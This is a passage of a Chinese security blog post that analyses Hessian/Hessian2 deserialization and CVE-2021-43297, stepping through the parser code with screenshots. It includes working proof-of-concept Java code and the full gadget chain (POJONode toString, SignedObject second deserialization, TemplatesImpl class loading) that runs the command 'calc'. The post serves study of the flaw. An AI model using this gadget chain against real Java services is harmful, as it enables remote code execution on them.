src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690230982694-cf9c81e8-dc07-4640-bf31-baf807300aa5.png#averageHue=%233d5845&clientId=u3806880a-78e5-4&from=paste&height=50&id=ub038b88a&originHeight=75&originWidth=391&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=14794&status=done&style=none&taskId=u0209824b-6b48-498e-a8a2-c7ef5afc5a9&title=&width=260.6666666666667" alt="image.png"><br>进入switch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690230992380-86006626-aa59-45fe-bd00-c404301f4527.png#averageHue=%23313637&clientId=u3806880a-78e5-4&from=paste&height=151&id=uc500fca7&originHeight=227&originWidth=756&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=69671&status=done&style=none&taskId=u34983861-c77e-405e-a801-57b5ba53771&title=&width=504" alt="image.png"><br>M对应ascii码值77，进入readType<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231014819-a27c4301-0fdd-4520-bfc5-c0427a3ffca2.png#averageHue=%234a584b&clientId=u3806880a-78e5-4&from=paste&height=316&id=u92a0e39d&originHeight=474&originWidth=648&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=149813&status=done&style=none&taskId=u2ce454a2-d5dc-4d2b-8497-167e27ee502&title=&width=432" alt="image.png"><br>也没干啥，又读了一个字节码，然后判断了一下，意义不大好像<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231041455-3e79dec0-1cfc-44b7-a9d8-229a709c47c3.png#averageHue=%23303c48&clientId=u3806880a-78e5-4&from=paste&height=105&id=u6a0d0ffb&originHeight=157&originWidth=1073&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=63250&status=done&style=none&taskId=u42e9dfb3-0dc8-4041-a335-c09e6e0b66c&title=&width=715.3333333333334" alt="image.png"><br>进入readMap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231064684-9c3a066c-5a80-4db9-a69a-da299f2ff58a.png#averageHue=%23303436&clientId=u3806880a-78e5-4&from=paste&height=273&id=udc0a4a72&originHeight=409&originWidth=929&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=156798&status=done&style=none&taskId=ud0ca0350-81d4-4291-bcba-756ae25a9cc&title=&width=619.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231080209-4468f67c-0f49-4ab6-9293-406d126e16c8.png#averageHue=%23303436&clientId=u3806880a-78e5-4&from=paste&height=108&id=u19c56c8d&originHeight=162&originWidth=1112&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=66711&status=done&style=none&taskId=ubcd8be8c-8be8-4183-b857-252fd98c1c9&title=&width=741.3333333333334" alt="image.png"><br>新建了一个MapDeserializer，如果走过一遍writeObject的，就会发现有点熟悉，序列化时会从hashmap获取mapserialize<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231146190-d65e441d-8a13-43f0-a9fb-cd63bc62b30a.png#averageHue=%23383b3a&clientId=u3806880a-78e5-4&from=paste&height=395&id=u6b0ecfb9&originHeight=593&originWidth=1024&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=241891&status=done&style=none&taskId=u86b46a68-949b-4df1-87c2-0156456a9ad&title=&width=682.6666666666666" alt="image.png"><br>上面一系列的意义不大，到此处字节码中只剩下了HessianInput类，在writeObject中，writeObject了hashmap中的键值对，此处即可读出EqualsBean，再进入map.put函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690231262027-45cff541-8a16-48bb-8dd9-ebe5522572bb.png#averageHue=%23313f4d&clientId=u3806880a-78e5-4&from=paste&height=80&id=u0ae2c670&originHeight=120&originWidth=1112&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59392&status=done&style=none&taskId=u77493b85-ec3e-4cb4-9210-74dad8a1fd8&title=&width=741.3333333333334" alt="image.png"><br>后面就是经典的ROME链的触发了，就懒得讲了，现在时间是04点41分，看会别的了<br>总结出来就是这个hessian.input只能触发hashcode？好像也能触发equals，呃呃好像·不行，不过无所谓，我比较喜欢我上一篇写的jdk自带的，虽然很抽象，但是很好用，感觉以后的比赛中也能派上用场</p>
<h3 id="Hessian2的readObject"><a href="#Hessian2的readObject" class="headerlink" title="Hessian2的readObject"></a>Hessian2的readObject</h3><p>这个b依赖里，有hessian和hessian2，两个的功能差不多，上面的poc改一下序列化和反序列化函数就可以用了</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">public static byte[] Hessian2_Serial(Object o) throws IOException &#123;
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    Hessian2Output hessian2Output = new Hessian2Output(baos);
    hessian2Output.writeObject(o);
    hessian2Output.flushBuffer();
    return baos.toByteArray();
&#125;


//hessian2依赖的反序列化
public static Object Hessian2_Deserial(byte[] bytes) throws IOException &#123;
    ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
    Hessian2Input hessian2Input = new Hessian2Input(bais);
    Object o = hessian2Input.readObject();
    return o;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>基本上差不多啊，也是读字节码拿tag，然后进switch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690232016121-50162a63-762c-430a-a0bb-55e76aa4dfb9.png#averageHue=%23303a44&clientId=u3806880a-78e5-4&from=paste&height=143&id=u82c2399c&originHeight=215&originWidth=1349&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=122066&status=done&style=none&taskId=uc9defb4a-ec3d-4378-ba79-01197dd114b&title=&width=899.3333333333334" alt="image.png"><br>72对H，进readMap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690232038750-204f4c6d-c2f0-4f3e-8a45-92564577018d.png#averageHue=%23313637&clientId=u3806880a-78e5-4&from=paste&height=123&id=u322a571e&originHeight=185&originWidth=793&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=55949&status=done&style=none&taskId=u253ef632-2c7b-418b-945f-9b2d92d94b1&title=&width=528.6666666666666" alt="image.png"><br>然后就又回到了上面的readMap，还是一样的调用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690232052516-3b0103db-35cc-4b5b-b804-625ccc9d0abb.png#averageHue=%23313638&clientId=u3806880a-78e5-4&from=paste&height=391&id=ue660b6c8&originHeight=587&originWidth=980&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=208352&status=done&style=none&taskId=ua16533f7-b9c3-4d27-be48-96a000d527c&title=&width=653.3333333333334" alt="image.png"></p>
<h3 id="CVE-2021-43297-Hessian2-toString链"><a href="#CVE-2021-43297-Hessian2-toString链" class="headerlink" title="CVE-2021-43297 Hessian2 toString链"></a>CVE-2021-43297 Hessian2 toString链</h3><h4 id="链1"><a href="#链1" class="headerlink" title="链1"></a>链1</h4><p>序列化的函数</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">Hessian2_toString_serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Hessian2Output</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    out<span class="token punctuation">.</span><span class="token function">setSerializerFactory</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    out<span class="token punctuation">.</span><span class="token function">getSerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
    out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>POC</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">      <span class="token comment">//使用javassist重写了jackson</span>
tools<span class="token punctuation">.</span><span class="token function">overrideJackson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">//创建一个恶意templates，命令为calc</span>
      <span class="token class-name">Object</span> templates <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">getTemplates</span><span class="token punctuation">(</span>tools<span class="token punctuation">.</span><span class="token function">getshortclass</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">POJONode</span> jsonNodes1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      tools<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span><span class="token string">"val"</span><span class="token punctuation">,</span>jsonNodes1<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">//装填至signObject中</span>
      <span class="token class-name">Object</span> signObject <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">second_serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">POJONode</span> jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>signObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token comment">//进行序列化和反序列化</span>
      <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> baos <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">tools<span class="token punctuation">.</span></span>Hessian2_toString_serialize</span><span class="token punctuation">(</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name"><span class="token namespace">tools<span class="token punctuation">.</span></span>Hessian2_Deserial</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>链子顺序为</p>
<pre class="line-numbers language-none"><code class="language-none">Hessian2.readObject
		POJONode.toString
    	SignedObject.getObject
        BadAttributeValueExpException.readObject
        	POJONode.toString
        		TemplatesImpl.getOutputProperties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>开始readObject分析<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301540946-7376efc3-ca86-45ea-af20-61bb004f2701.png#averageHue=%23334250&clientId=uf9f2cb12-9066-4&from=paste&height=212&id=u57b24310&originHeight=212&originWidth=1628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=160810&status=done&style=none&taskId=u2765c9ef-4f5c-4330-9bfc-cb9b9491def&title=&width=1628" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301551711-1ece2aa0-9d6b-4d4e-b240-9250a8d3678b.png#averageHue=%23303436&clientId=uf9f2cb12-9066-4&from=paste&height=503&id=u08c6e249&originHeight=503&originWidth=1430&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218007&status=done&style=none&taskId=u4842f784-1b1a-4ff0-b24d-22bae5a6671&title=&width=1430" alt="image.png"><br>取出序列化数据中的第一个byte为tag，值79，进入switch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301626376-e654a5b2-7066-44ab-a104-a9da4eca0c51.png#averageHue=%23546156&clientId=uf9f2cb12-9066-4&from=paste&height=466&id=udef042a4&originHeight=466&originWidth=947&originalType=binary&ratio=1&rotation=0&showTitle=false&size=157256&status=done&style=none&taskId=u3763a7b7-292b-410e-88b2-189f89dd836&title=&width=947" alt="image.png">79ascii码值对应O，进入case中，进入readInt函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301657114-a3941a8a-dd1e-4da9-b14c-fa1fc9b8fa05.png#averageHue=%23383c3a&clientId=uf9f2cb12-9066-4&from=paste&height=651&id=u995acd15&originHeight=651&originWidth=1227&originalType=binary&ratio=1&rotation=0&showTitle=false&size=219688&status=done&style=none&taskId=u537fee28-5776-4a27-bdae-b82a04cef20&title=&width=1227" alt="image.png"><br>再次读取一个byte，进入switch，67取C，但是switch并没有对应的case，进入default，进入了expect函数，传入tag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301715207-acfe1e9d-4569-4a94-af62-24410549c69b.png#averageHue=%23333739&clientId=uf9f2cb12-9066-4&from=paste&height=197&id=u2fe1b3cb&originHeight=197&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67732&status=done&style=none&taskId=u215407d1-1a4a-442c-be14-4e5a5ad6c4b&title=&width=1016" alt="image.png"><br>执行了readObject，从中获取了POJOnode类对象<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301808305-f285d71d-ef70-49ff-b402-50055da83a34.png#averageHue=%23323739&clientId=uf9f2cb12-9066-4&from=paste&height=635&id=ua8591c73&originHeight=635&originWidth=1250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=249625&status=done&style=none&taskId=u1c367a3f-654c-4377-b0d6-a3610ccc31e&title=&width=1250" alt="image.png"><br>obj不为null，进入if函数，其中对obj进行了字符串拼接操作，触发了POJONode的toString方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301817084-21347bd6-b1c5-4f68-8834-dc921cfa84a6.png#averageHue=%2332383e&clientId=uf9f2cb12-9066-4&from=paste&height=376&id=u164f9498&originHeight=376&originWidth=1521&originalType=binary&ratio=1&rotation=0&showTitle=false&size=213599&status=done&style=none&taskId=u358023f9-8aed-49a4-8e2d-16f5c8d7b3a&title=&width=1521" alt="image.png"><br>后面就是经典的jackson的任意getter调用，BaseJsonNode是POJONode的父类，也是走的父类的toString方法触发getter<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301925769-1976e865-fcfb-47e2-8607-55d8c396a3f1.png#averageHue=%23454844&clientId=uf9f2cb12-9066-4&from=paste&height=617&id=ubd39843f&originHeight=617&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&size=422317&status=done&style=none&taskId=uf2dd610a-c80e-4daa-b9d8-4e878d6ce73&title=&width=1678" alt="image.png"><br>触发SignedObject的getObject，进行二次反序列化，之前有说到templates没法参与hessian序列化和反序列化，是因为其中存在修饰符，我们可以通过用二次反序列化去调用jdk原生序列化和反序列化去触发templates的恶意类加载<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690301970207-860b778a-7fe8-4b2d-b940-f07a893a96b4.png#averageHue=%23333839&clientId=uf9f2cb12-9066-4&from=paste&height=906&id=uceacfd20&originHeight=906&originWidth=1360&originalType=binary&ratio=1&rotation=0&showTitle=false&size=350617&status=done&style=none&taskId=ub3556522-4b9c-432d-a499-464092febad&title=&width=1360" alt="image.png"></p>
<h4 id="链2"><a href="#链2" class="headerlink" title="链2"></a>链2</h4><p>两个链子的区别就在于写入的字节码，这里写入的是67</p>
<pre class="line-numbers language-none"><code class="language-none">public static byte[] Hessian2_toString_serialize(Object o) throws IOException &#123;
    ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();
    Hessian2Output out &#x3D; new Hessian2Output(baos);
    baos.write(67);  &#x2F;&#x2F;改成67即可
    out.setSerializerFactory(new SerializerFactory());
    out.getSerializerFactory().setAllowNonSerializable(true);
    out.writeObject(o);
    out.flush();
    return baos.toByteArray();
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在readObject处取出我们写入的字节67<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690303356795-913a6a41-7c6e-4524-8e24-1b53b67664e9.png#averageHue=%23313537&clientId=uf9f2cb12-9066-4&from=paste&height=487&id=ua4b2ecb2&originHeight=487&originWidth=1329&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182942&status=done&style=none&taskId=u9d41806c-6900-43ba-b4cd-e4b7e268788&title=&width=1329" alt="image.png"><br>67对应C，进入readObjectDefinition函数<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690303380170-f38dfb96-32cb-456e-a621-918ec7f49971.png#averageHue=%23373c3d&clientId=uf9f2cb12-9066-4&from=paste&height=283&id=u74b81d97&originHeight=283&originWidth=1062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102682&status=done&style=none&taskId=uf4ff982e-ee80-4b37-b29b-4f56aa46dd9&title=&width=1062" alt="image.png"><br>进入readString函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690303395573-5cdc4ade-6372-4db6-9860-d9ac3c55a081.png#averageHue=%23313536&clientId=uf9f2cb12-9066-4&from=paste&height=352&id=u47b73b0b&originHeight=352&originWidth=1207&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148810&status=done&style=none&taskId=u3a56e937-af88-4034-97da-43ebe9d31ec&title=&width=1207" alt="image.png"><br>继续读一个字节码为67，进入switch<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690303425793-1583a1d3-813c-498b-99aa-ffbd2d2fc2da.png#averageHue=%23393e3a&clientId=uf9f2cb12-9066-4&from=paste&height=501&id=u9d7b072d&originHeight=501&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162114&status=done&style=none&taskId=u75baf77b-4f55-4d4d-b851-062cd07321a&title=&width=1009" alt="image.png"><br>因不存在进入expect，后续具体实现逻辑和链1一样<img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1690303454086-d7807638-26fb-4624-bd7a-0bd2b0cb2cd0.png#averageHue=%23475147&clientId=uf9f2cb12-9066-4&from=paste&height=271&id=ub790062f&originHeight=271&originWidth=974&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88447&status=done&style=none&taskId=uc995025d-34e6-4c2a-b7d3-80bda043ce5&title=&width=974" alt="image.png"></p>
<h3 id="更多内容"><a href="#更多内容" class="headerlink" title="更多内容"></a>更多内容</h3><p>实际上hessian还有很多玩法，例如hessian反序列化时会使用map.put，还可以通过一些操作使他能够触发equals等操作，Java真是太有意思了</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2023/07/24/%E4%B8%80%E6%9D%A1%E6%8A%BD%E8%B1%A1%E7%9A%84equals%E8%A7%A6%E5%8F%91%E9%93%BE/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2023-07-26 05:21:13
            </span>
            
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian%E4%BB%8B%E7%BB%8D"><span class="toc-text">hessian介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">Hessian序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#com-caucho-hessian"><span class="toc-text">com.caucho.hessian</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#com-alipay-sofa-hessian"><span class="toc-text">com.alipay.sofa.hessian</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84poc%E5%8F%8A%E5%8E%9F%E5%9B%A0"><span class="toc-text">失败的poc及原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc"><span class="toc-text">二次反序列化poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeObject"><span class="toc-text">writeObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readObject"><span class="toc-text">readObject</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian2%E7%9A%84readObject"><span class="toc-text">Hessian2的readObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-43297-Hessian2-toString%E9%93%BE"><span class="toc-text">CVE-2021-43297 Hessian2 toString链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE1"><span class="toc-text">链1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%93%BE2"><span class="toc-text">链2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E5%86%85%E5%AE%B9"><span class="toc-text">更多内容</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
        placeholder: 'welcome!',
        avatar: 'retro',
        lang: 'en'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F26%2FHessian%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/26/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" title="Facebook">
